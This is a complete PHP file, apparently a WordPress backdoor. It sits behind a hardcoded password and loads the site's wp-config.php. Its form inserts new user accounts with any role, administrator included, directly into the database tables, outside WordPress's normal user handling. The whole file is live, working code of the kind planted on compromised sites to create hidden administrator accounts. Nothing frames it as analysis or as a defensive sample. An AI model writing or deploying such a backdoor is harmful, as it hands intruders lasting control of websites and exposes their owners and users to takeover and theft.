<?php
session_start();
$ewean = "ga9688";
if (!isset($_SESSION["authenticated"])) {
    if (isset($_POST["password"])) {
        if ($_POST["password"] === $ewean) {
            $_SESSION["authenticated"] = true;
        } else {
            echo "Password salah!";
        }
    }
    if (!isset($_SESSION["authenticated"])) {
        echo "<form method=\"post\">";
        echo "Password: <input type=\"password\" name=\"password\">";
        echo "<input type=\"submit\" value=\"Login\">";
        echo "</form>";
        die;
    }
}
?>
<!doctypehtml><html lang="en"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Add New User</title><link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"rel="stylesheet"></head><?php 
?>
<body><?php 
require_once $_SERVER["DOCUMENT_ROOT"] . "/wp-config.php";
function custom_insert_user($username, $email, $password, $role = "subscriber")
{
    global $wpdb;
    $existing_user = $wpdb->get_var($wpdb->prepare("SELECT user_login FROM {$wpdb->users} WHERE user_login = %s OR user_email = %s", $username, $email));
    if ($existing_user) {
        return new WP_Error("existing_user", __("User with this username or email already exists.", "your-text-domain"));
    }
    $hashed_password = wp_hash_password($password);
    $wpdb->insert($wpdb->users, array("user_login" => $username, "user_pass" => $hashed_password, "user_email" => $email, "user_registered" => current_time("mysql")));
    $user_id = $wpdb->insert_id;
    $wpdb->insert($wpdb->usermeta, array("user_id" => $user_id, "meta_key" => $wpdb->prefix . "capabilities", "meta_value" => serialize(array($role => true))));
    return $user_id;
}
global $wp_roles;
$roles = $wp_roles->get_names();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    $role = $_POST["role"];
    $result = custom_insert_user($username, $email, $password, $role);
    if (!is_wp_error($result)) {
        echo "User inserted successfully with ID: " . $result;
    } else {
        echo "Error: " . $result->get_error_message();
    }
}
?>
<div class="container mt-5"><div class="justify-content-center row"><div class="col-md-6"><div class="card"><div class="card-body"><h5 class="card-title">Add New User</h5><form method="post"><div class="form-group"><label for="username">Username:</label> <input class="form-control"id="username"name="username"></div><div class="form-group"><label for="email">Email:</label> <input class="form-control"id="email"name="email"type="email"></div><div class="form-group"><label for="password">Password:</label> <input class="form-control"id="password"name="password"type="password"></div><div class="form-group"><label for="role">Role:</label> <select class="form-control"id="role"name="role"><?php 
foreach ($roles as $role_key => $role_value) {
    ?>
<option value="<?php 
    echo esc_attr($role_key);
    ?>
"><?php 
    echo esc_html($role_value);
    ?>
</option><?php 
}
?>
</select></div><button class="btn btn-primary"type="submit">Submit</button></form></div></div></div></div></div></html><?php 